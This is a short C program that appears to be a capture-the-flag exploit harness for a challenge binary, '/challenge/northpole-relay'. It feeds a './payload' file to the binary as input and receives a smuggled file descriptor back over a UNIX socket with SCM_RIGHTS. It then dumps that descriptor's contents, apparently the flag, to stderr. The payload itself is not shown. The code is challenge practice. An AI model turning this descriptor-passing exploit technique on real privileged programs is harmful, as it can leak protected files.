#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <unistd.h>

[[noreturn]] void child_process(int socket_fd, int stdin_fd) {
  if (dup2(socket_fd, 101) == -1) {
    err(EXIT_FAILURE, "dup2");
  }
  close(STDIN_FILENO);
  if (dup2(stdin_fd, 0) == -1) {
    err(EXIT_FAILURE, "dup2(stdin)");
  }

  char* argv[] = {"/challenge/northpole-relay", nullptr};
  char* envp[] = {nullptr};

  if (execve(argv[0], argv, envp) == -1) {
    err(EXIT_FAILURE, "execve");
  }
  __builtin_unreachable();
}

int main(void) {
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) == -1) {
    err(EXIT_FAILURE, "socketpair");
  }
  int payload_fd = open("./payload", O_RDONLY);
  if (payload_fd == -1) {
    err(EXIT_FAILURE, "open(payload)");
  }

  pid_t pid = fork();
  if (pid == -1) {
    err(EXIT_FAILURE, "fork");
  }
  if (pid == 0) {
    close(sockets[0]);
    child_process(sockets[1], payload_fd);
  }

  close(payload_fd);
  close(sockets[1]);

  alignas(struct cmsghdr) char buf[CMSG_SPACE(sizeof(int))] = {};
  char dummy = 'x';

  struct iovec io = {
      .iov_base = &dummy,
      .iov_len = 1,
  };

  struct msghdr msg = {
      .msg_iov = &io,
      .msg_iovlen = 1,
      .msg_control = buf,
      .msg_controllen = sizeof(buf),
  };

  ssize_t res = recvmsg(sockets[0], &msg, 0);
  if (res < 0) {
    err(EXIT_FAILURE, "recvmsg");
  }

  struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
  assert(cmsg != nullptr);
  assert(cmsg->cmsg_type == SCM_RIGHTS);
  int flag_fd = -1;
  memcpy(&flag_fd, CMSG_DATA(cmsg), sizeof(int));

  sendfile(STDERR_FILENO, flag_fd, 0, 0x1000);
  return 0;
}
